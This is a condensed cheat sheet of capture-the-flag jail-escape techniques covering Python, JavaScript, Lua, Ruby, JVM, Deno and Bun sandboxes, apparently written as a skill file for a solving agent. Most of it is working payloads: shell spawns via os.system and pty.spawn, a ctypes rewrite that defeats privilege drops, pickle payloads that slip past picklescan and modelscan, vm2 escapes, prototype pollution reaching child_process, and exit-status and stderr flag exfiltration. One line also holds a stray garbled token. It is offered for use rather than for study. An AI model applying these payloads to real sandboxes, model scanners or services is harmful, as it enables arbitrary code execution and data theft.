# Misc-Pyjail Writeup-Distilled Patterns R2, Part 1 — Hardened Pyjails + Language Jails (W37–W51)

Continues SKILL.md W1–W36 (R1, 411 writeups). Every pattern below is NEW vs R1:
name → signals → steps → payloads → pitfalls → 2–3 R2-manifest URLs.
Local-test every payload on a matching-minor copy before the gated shot.
Technique-only, no flag values.

## W37 — sys.monitoring hook jails (BRANCH/CALL kill-hooks)

Signals: `sys.monitoring` / `sm.use_tool_id` in source; `set_local_events(BRANCH+CALL)` +
`register_callback(... exit_hook)`; `exec(code, {}, {})`; flag file nearby.
Steps: (1) confirm ONLY BRANCH+CALL are watched (read the `set_local_events` line);
(2) run hook-free prologue FIRST: `import sys; sys.modules['__main__'].__dict__['_exit']=int`
(assignment/subscript produce no CALL/BRANCH on your code object); (3) only then trigger
the first call (`print(open('flag.txt').read())`) — the hook fires but calls your harmless
rebind. Alt: `import os; os.environ['BROWSER']='/bin/sh -c "cat flag.txt" #%s'; import antigravity`;
alt: `__builtins__["__import__"]=lambda *a,os=os: os.system("sh"); import x`.
Pitfalls: any CALL before the rebind kills the process — order is everything; the hook
closes over the NAME `_exit`, so rebind the module dict entry, not a local.
Sources:
- https://github.com/jailctf/challenges-2025/blob/master/computer-monitor/solve/README.md
- https://github.com/mirelgigel/writeupjailctf
- https://blog.maksimhayder.com/posts/jailctf-2025/

## W38 — RestrictedPython / container-module jails

Signals: `RestrictedPython`, battlecode/robocode containers, `import_call` allowlist
(`random`/`math`/`enum` only).
Steps: (1) list what each allowed module re-exports: `dir(enum)` shows `sys`,
`bltns`, `bin`, `reduce`, `property`; (2) pivot `enum.sys` → `sys.modules["os"]`
→ `system("cat /app/flag.txt")`; (3) same shape for Julia AST jails (only
non-`call` nodes allowed): overload an exposed operator instead of calling, and
for `datetime`/shim modules that leak `sys`/`os` as attributes. General rule:
allowlisted modules/operators are chosen for API, not for attribute hygiene —
enumerate, don't assume.
Pitfalls: some runners strip `__dict__` on the module object — then use
`getattr` chains or exception-frame globals instead.
Sources:
- https://github.com/jailctf/challenges-2025/blob/master/battlecode/solve/README.md
- https://blog.dongdigua.ooo/wp_jailctf_2025.html

## W39 — Audit-hook neutered-after-eval + repr smuggling

Signals: `addaudithook(hook→_exit)` + "disabling audit hook" + `exit = disabled_exit`
BEFORE `print(result)`; regex prefix gate (`match`, not `fullmatch`); `<=75` chars,
no space/underscore.
Steps: (1) satisfy the prefix with `0,` then arbitrary Python; (2) never act during
eval — build `type('',(),{'\x5f\x5frepr\x5f\x5f':lambda s:open('flag.txt').read()})()`
(hex escapes dodge the `_` ban); (3) `print()` renders the tuple AFTER the hook is
neutered, calling your `__repr__`. Alt two-step: `0,setattr(license,dir(license)[5],lambda:eval(input())),license`
then send the real payload at the second prompt.
Pitfalls: `0or...` parses as octal — use `0,` (tuple) not `0or`; target `__repr__`
(not `__str__`) since tuples render with `repr`; count the 75-char budget on the wire.
Sources:
- https://github.com/jailctf/challenges-2025/blob/master/calcdefanged/solve/README.md
- https://blog.maksimhayder.com/posts/jailctf-2025/
- https://github.com/mirelgigel/writeupjailctf

## W40 — 3.14 subinterpreter + setresuid jails

Signals: `concurrent.interpreters` + `syscall(117, nobody…)` + per-thread priv-drop;
flag 700 root-only; blacklist of `os/system/...`.
Steps: (1) recover builtins via subclasses ladder + `"e""val"` concat, call
`breakpoint()`; (2a) ctypes int-rewrite: `ptr=id(117); cast(ptr+24)[0]=106`
(`setresuid`→`setgid`, drop silently fails), exit debugger, next interpreter
inherits the poisoned constant; (2b) generator-frame escape to main-interpreter
`f_builtins`, plant `__reduce__` pickle smuggle on the returned `success` object —
unpickled in the STILL-ROOT main thread; (2c) pdb + `signal(SIGUSR1, fh)` where
`fh` reads the flag — `setresuid` is per-thread so the main thread stays root,
`tgkill` it. C++-charset variant: `goto *one_gadget` with `register` keyword, or
`movabs`-encoded jumping shellcode when parens are banned.
Pitfalls: the int object `117` may be shared — verify the rewrite locally; pick the
PoC whose primitives (pdb vs ctypes vs signal) survive YOUR filter set.
Sources:
- https://dummykitty.github.io/posts/TFCCTF-2025-%CE%A0jail/
- https://jsur.in/posts/2025-10-08-jailctf-2025-stupidcplusplus
- https://github.com/jailctf/challenges-2025/blob/master/stupidcplusplus/solve/README.md

## W41 — NFKC + no-parens operator-overwrite jails

Signals: `unicodedata.normalize("NFKC", input)` + bans on `._`, parens, quotes,
`+-*/ `, sometimes `breakpoint`; `eval` with printed result (nocall) or silent (revenge).
Steps: (1) NFKC kills unicode-identifier tricks — don't fight it; (2) overwrite a
dunder operator instead of calling: `{0 for help.__class__.__invert__ in {input}}`
then `~help` CALLS input with zero parens; `{0 for help.__class__.__xor__ in {eval}}`
then `help^~help`; (3) `class foo: pass; foo.__neg__=breakpoint` shape where
statements are allowed; (4) walrus `{print:=exec}` + `and`-chaining to turn a
printed `result` into a second eval stage.
Pitfalls: walrus targets can't be complex expressions — use the `for`-binder form;
`.\t_` (tab) passes the `._` substring check where plain `._` dies.
Sources:
- https://flydragonw.github.io/posts/hitconctf_2025/
- https://github.com/Vincent550102/My-CTF-Challenge/blob/main/AIS3-preexam/2025/Readme.md
- https://p23.tw/2025/06/30/AIS3-Pre-exam-2025-Writeups/

## W42 — No-output exfil: stderr / exit-status / panic channels

Signals: `sys.stdout.close()` + `flag` in eval scope; OR whitelist-Rust with `!`/`;`
banned; OR allowlist-audit-hook that still permits `_posixsubprocess`.
Steps: (1) stderr: `{}[flag]` → `KeyError: '<flag>'` on stderr; or
`print(flag, file=sys.stderr)` via recovered builtins; (2) exit-status:
`_posixsubprocess.fork_exec([b"/bin/sh",b"-c",b"exit $(...char...)"]...)` +
`sys.exit(os.waitpid(pid,0)[1]//256)` — one byte per run; (3) Rust/compiled:
`std::process::exit(byte as i32)` per index, or `panic_any(string)` for a clean
single-shot message when macros are banned.
Pitfalls: `set()` scrambles multi-line output — prefer `*`-splat/`help()`;
close+reopen races cost probes — budget one probe per byte and cap at flag length.
Sources:
- https://blog.maksimhayder.com/posts/jailctf-2025/
- https://hofill.me/writeup/ezoj
- https://github.com/jailctf/challenges-2025/blob/master/rustjail/solve/README.md

## W43 — Compiler/service-as-file-reader jails (asm, C++, dc, bash)

Signals: user input fed to `pwntools.asm` / `g++` / `dc` / `bash -c` with no
execute step of its own.
Steps: (1) assembler: `.incbin "flag.txt"` — directives run at build time, output
is hex-printed; (2) dc: `!` runs shell lines, `?` reads+executes input as code,
`a` pushes ASCII chars (build strings without quotes), `x` executes strings as
macros — read the man page before guessing; (3) C++ charset jail: `goto *expr`
for free RIP + `extern` linker symbols + `sizeof`-typed 64-bit constants, or
`movabs`-smuggled jumping shellcode; (4) bash-eval jail: `$1`/`$_` slicing +
`$((...))` arithmetic expansion to synthesize letters (`wa`-prefix/flag-word filters
die to `${IFS}` and `ls|xargs cat`).
Pitfalls: assembler directives resolve relative to the SERVICE cwd — confirm with
a listing first; dc `!` needs the full line after it; C++ `goto *` needs exact
`register`-pinned constraints for one-gadgets.
Sources:
- https://github.com/jailctf/challenges-2025/blob/master/asmaas/solve/solve.py
- http://platypwnies.de/writeups/2025/gpn/jail/
- https://blog.dongdigua.ooo/wp_jailctf_2025.html

## W44 — Grammar-shaped pyjails (length/charset/occurrence budgets)

Signals: `len(set(input))<=N`, prime/collatz/increasing word lengths, single-`.`/single-char
budgets, `<=14`-char limits, `<=5`-char exec loops, no-`e`, parity-alternating ASCII.
Steps: (1) name the budget, then pick the ONE spelling per token:
single-dot → lambda-held `__getattribute__`; prime-words → `\xXX` escapes +
`'aa'.__len__()`-derived numbers + `False`-as-0; collatz → `[value][000…]` pads;
`<=14` → re-alias `input` to a 1-char name then re-enter `f(`; `<=5` exec-loop →
`a=all;len=a` (kills the length check itself) or `exit(flagbuf)` stderr leak;
no-`e` → `\x65` escapes + `__dict__`-list indexing; parity-jail → tab/space +
quote-alternation + string-addition smuggled `eval`; FANGELSE-side-channel is
length-xor only — ignore it, attack the exec loop. (2) measure the WIRE form:
escapes count as source chars. (3) verify with a local checker before sending.
Pitfalls: stacking all evasions "to be safe" blows every budget — one spelling per
blocked token; `all(code)>5`-style self-reference checks are themselves the target.
Sources:
- https://ctf.cirno.party/2025/11/01/fangelse.html
- https://medium.com/@mhayder1964/jailctf-2026-writeups-8c593833daed
- https://github.com/jailctf/challenges-2025/blob/master/one/solve/README.md
- https://blog.ic3dt3a.org/posts/2024jailctf/

## W45 — Scanner-differential pickles (modelscan / fickling / picklescan)

Signals: upload `.pkl`/`.pt` → scanner verdict → `pickle.loads`/`torch.load` only if
clean; `modelscan`, `picklescan`, fickling in requirements; truncation (`[:23]`)
before scan.
Steps: (1) truncation gap: put the malicious opcode AFTER the scanned prefix
(modelscanjail: 23-byte scan vs full-file load); (2) analyzer gap: fickling flags
`REDUCE` (unused-variable) but not `NEWOBJ` — rebuild execution as
`tuple(map(pty.spawn, ('/bin/sh',)))` via `NEWOBJ` only; (3) format gap: scanner
keys off extension/format — polyglot the payload (BMP+pickle, gzip-comment PDF,
safetensors-I8) so the scanner sees a clean file; (4) confirm locally with the
PINNED scanner version (`picklescan==x.y.z`), never latest.
Pitfalls: scanner versions drift fast — the bypass is version-specific; `weights_only`
is not absolute (SETITEM confusion) but don't rely on it when a format gap exists.
Sources:
- https://github.com/jailctf/challenges-2025/blob/master/modelscanjail/solve/README.md
- https://github.com/RootRunners/HeroCTF-v7-RootRunners-Official-Write-ups/blob/main/Misc/Irreductible_2/README.md
- https://rolbk.com/tags/pickle/

## W46 — Pickle opcode-confusion + oracle pickles

Signals: custom `Unpickler.find_class`, `H4cker`-style stub classes, `SHORT_BINBYTES`
(`C`) vs `BINBYTES` (`B`) length games, `}`-parsing quirks, C-vs-Python unpickler
choice, `STACK_GLOBAL`/`BUILD`-only allowlists.
Steps: (1) length-confusion: `B+1=C` (or `(0xfe+1)%0xff=0` modulo wrap) flips a
bytes-opcode so trailing attacker bytes become a second program; (2) `}`-as-empty-dict:
craft `players` so `name in players` becomes a 1-bit oracle per byte and grind the
flag (inspired by lost-in-transit); (3) C-vs-Python-vs-`pickletools` triple:
brute-force ≤8-byte inputs until the three implementations DISAGREE, then feed the
discriminating triple; (4) STACK_GLOBAL + hex-escaped names vs substring blacklists.
Pitfalls: `\x10` truncates `stdin` reads — avoid it in interactive payloads; always
`pickletools.dis` YOUR bytes, never assume opcode layout across protocols.
Sources:
- https://yun.ng/c/ctf/2025-sekai-ctf/misc/discrepancy
- https://www.woodwhale.cn/2024-qwb-misc-pickle-jail-wp/
- https://medium.com/@harryfyx/writeup-uiuctf-2024-push-and-pickle-cf821c49194f

## W47 — JS sandbox jails (Proxy grammars, vm2, pollution chains)

Signals: `root(...)`-only grammars, `vm2` version in `package.json`, lodash `set`
on query params, `constructor.prototype` merges, `this.constructor.constructor`.
Steps: (1) Proxy-grammar jail: enumerate array-method names, synthesize
`constructor` char-by-char (`at.name`, `fromCharCode`), climb
`String→Function` without ever spelling it; (2) vm2 pinned-old: match CVE PoC to
the EXACT version (3.9.5 vs 3.9.19 differ), smuggle it past alpha-regexes with
JSFuck, or pair with lodash pollution (`__proto__.require.builtin[]=*`) to unlock
`require('child_process')`; (3) pollution-to-eval: `constructor.prototype` beats
`__proto__` filters — pollute the flag the gate reads (`unlocked`), then replay
the winning move; (4) null-context `runInNewContext`: Proxy-get + callee.caller
+ `Array.prototype.some` to reach the require whitelist.
Pitfalls: vm2 PoCs are version-fragile — wrong minor = silent fail; `Function`
kills some jails instantly (`process.exit(1)` traps) — prefer constructor-smuggle.
Sources:
- https://k3sero.github.io/posts/Proxy_chain-SecconCTF2025/
- https://youssifseliem.github.io/CTF/Arab%20Cyber%20War%20Games%20Qualifications%202024/secure%20calc%20(web).html
- https://blog.szymex.pw/ctf/mega_shp/js_calculator
- https://exploitnotes.hashnode.dev/tryhackme-fool-s-mate-revenge

## W48 — Lua `load`-bytecode smuggling

Signals: lupa/sandboxed `load` exposed under another name (`load_state`), game
automation scripts, wasmoon/WASM interpreters, `string.dump` available.
Steps: (1) check whether `load` accepts BYTECODE (Lua 5.2+: no verifier at all;
5.1: verifier has known bypasses) — compile `os.execute`/`io.open` offline with
`string.dump`, smuggle the chunk through the exposed loader; (2) exfil via any
in-VM channel (chat error strings, action-int fields) when stdout/net are cut;
(3) WASM builds: type-confusion on loop opcodes → addrof → fake-closure →
indirect-call the registered win function; (4) if `load` is absent, enumerate
`_G` for `package.loadlib`/LuaJIT-`ffi`/`debug` first.
Pitfalls: bytecode is version-specific (5.1 vs 5.2 vs 5.4 vs WASM-32 layouts
differ) — build the chunk with the TARGET's exact runtime.
Sources:
- https://face.0xff.re/posts/sstic-challenge-2025-writeup/
- https://suidpit.sh/posts/2024-09-12-escape_alcawasm/
- https://hacktricks.wiki/en/generic-methodologies-and-resources/lua/bypass-lua-sandboxes/index.html

## W49 — Ruby / Perl / Raku / OCaml stripped-stdlib jails

Signals: `RubyVM::AbstractSyntaxTree` opcode denylists, `class_eval`/`send` ပဲ;
`perl -e` + length/charset gates; Raku `EVAL` + charset allowlists; OCaml with
nulled `Stdlib`/`open_in`/`stdout`.
Steps: (1) Ruby AST jail: opcodes ban CALL/FCALL — reach for non-call evaluation
(`send`, `class_eval`, octal-built strings, `system('cat'+32.chr+'flag.txt')`);
(2) Perl ≤5-char/no-letters: `die %ENV` / `die%ENV` — stderr prints the env that
holds the flag; (3) Raku: charset-limited `EVAL` + string-xor staged payloads;
(4) OCaml: re-declare the world with `external f : t = "caml_c_primitive"`
(`caml_sys_open`, `caml_ml_input_char`, …) and rebuild open/read/write from C.
Pitfalls: Ruby `$SAFE` is dead — don't assume legacy levels; Perl `Safe.pm`
opmask is advisory only; OCaml external names must match the RUNTIME's C stubs.
Sources:
- https://github.com/jailctf/challenges-2024/blob/master/ruby-on-jails/handout/chal.rb
- https://github.com/jailctf/challenges-2024/blob/master/SUS-Calculator/README.md
- https://alran.github.io/ctf-writeups/pages/jail.html
- https://medium.com/@nikhilc2209/stepping-down-into-the-ocaml-mines-uiuctf-2025-writeup-303a2eb5551a

## W50 — JVM / expression-language jails

Signals: Java source jail with word blacklists; ASM/`ConstantDynamic` hints;
JEXL/SpEL/EL `${...}` sinks; CNN-gated Java compile; `mythos` Perl/Python services.
Steps: (1) word-blacklist Java: reflection (`Class.forName("java.nio.file."+"Fil"+"es")`)
+ concat paths (`"fla"+"g.txt"`), ZWSP as backup; (2) ASM condy: generate the class
offline with `ClassWriter` + `ConstantDynamic`, pipe the last line to the service;
(3) EL injection: `new ('java.util.Scanner',new ('java.io.FileReader','/proc/self/cmdline'))`
(JEXL `new ()` space-bypass), SpEL blind-exfil via socket/`ls`-to-file staging,
EL double-evaluation error-message leaks; (4) CNN-gated: adversarial comment
suffixes (negative-weight filters) + `\uXXXX`/identifier-ignorable code points
that change wire bytes, not compiled semantics — then reflect into
`getDeclaredFields0` to null the `SecurityManager`.
Pitfalls: EL dialects differ (`new` vs `T()` vs `#{}`) — fingerprint first;
CNN padding is monotonic under softplus weights — never pad blindly, target hot windows.
Sources:
- https://github.com/rehackxyz/REUN10N/blob/main/CTF-writeups/2026/tkbctf5/misc-javajail.md
- https://gerlachsnezka.github.io/writeups/amateursctf/2024/jail/javajail2/
- https://cybersecurityelite.com/ctf-writeups/uiuctf-2026-misc-writeup/
- https://su-team.cn/post/rctf-2024-su-wu/

## W51 — Deno / Bun runtime jails + validator-gap jails

Signals: `Deno.*` permissions, `Bun.$`, TS-server file writes, Emacs
`native-compile` + Capstone CHECK, Zig validators.
Steps: (1) Deno: symlink TOCTOU (`chdir` race between check and use),
`/proc/self/cwd` allow-run confusion, GHSA prompt-spoof to reach
`/proc/self/mem`, patch `Builtins_JsonStringify`; (2) Bun: `Bun.file().size`
oracle + header-`eval` smuggle + PID-difference oracle
(`sleep`-bomb on match, measure PID deltas); nullbyte filename truncation +
`tsconfig.json` path-remap + crash-restart for RCE; (3) Emacs: put the read in a
COMPILER MACRO (`featurep` evals the whole form at compile time) or pass a
FILENAME (`"/flag.txt"`) so diagnostics leak before validation — validator sees
only the trivial `lea/mov/ret` function.
Pitfalls: Deno offsets are version-pinned; PID oracles need a quiet (per-team)
instance; compiler-macro properties must survive the service's env setup.
Sources:
- https://dudenation.github.io/posts/defcon-ctf-quals/
- https://ml-hacker.github.io/posts/hitcon2024/
- https://shellunease.github.io/posts/deadsecctf-2024-buntime/
- https://ctfbase.com/writeup/20260809_uiuc2026_emacsjail2
